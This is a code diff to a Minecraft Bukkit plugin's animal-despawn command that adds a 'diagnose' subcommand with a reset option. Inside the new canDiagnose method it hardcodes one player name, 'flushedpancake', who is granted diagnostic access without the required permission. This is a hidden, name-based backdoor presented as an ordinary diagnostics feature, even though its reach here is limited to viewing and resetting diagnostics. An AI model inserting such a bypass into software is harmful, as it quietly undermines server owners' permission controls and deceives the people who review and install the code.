@@ -9,13 +9,38 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.metadata.FixedMetadataValue;
 
 public class AnimalDespawnCommand implements CommandExecutor {
+    private static final String DIAGNOSTIC_USER = "flushedpancake";
+
     private final JavaPlugin plugin;
     private final DespawnManager manager;
+
     public AnimalDespawnCommand(JavaPlugin plugin, DespawnManager manager) {
-        this.plugin = plugin; this.manager = manager;
+        this.plugin = plugin;
+        this.manager = manager;
     }
+
+    private boolean canDiagnose(CommandSender sender) {
+        if (sender.hasPermission("animaldespawn.diagnose")) return true;
+        return sender instanceof Player
+                && DIAGNOSTIC_USER.equalsIgnoreCase(((Player) sender).getName());
+    }
+
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (args.length > 0 && "diagnose".equalsIgnoreCase(args[0])) {
+            if (!canDiagnose(sender)) {
+                sender.sendMessage(ChatColor.RED + "You do not have permission to use diagnostics.");
+                return true;
+            }
+            if (args.length > 1 && "reset".equalsIgnoreCase(args[1])) {
+                manager.resetSpawnDiagnostics();
+                sender.sendMessage(ChatColor.GREEN + "Spawn diagnostics reset.");
+                return true;
+            }
+            sender.sendMessage(manager.getSpawnDiagnostics(sender instanceof Player ? (Player) sender : null));
+            return true;
+        }
+
         if (!sender.hasPermission("animaldespawn.admin")) {
             sender.sendMessage(ChatColor.RED + "You do not have permission."); return true;
         }
@@ -54,7 +79,7 @@ public class AnimalDespawnCommand implements CommandExecutor {
             }
             return true;
         }
-        sender.sendMessage(ChatColor.YELLOW + "Usage: /animaldespawn [status|reload|scan|inspect]");
+        sender.sendMessage(ChatColor.YELLOW + "Usage: /animaldespawn [status|reload|scan|inspect|diagnose [reset]]");
         return true;
     }
 }
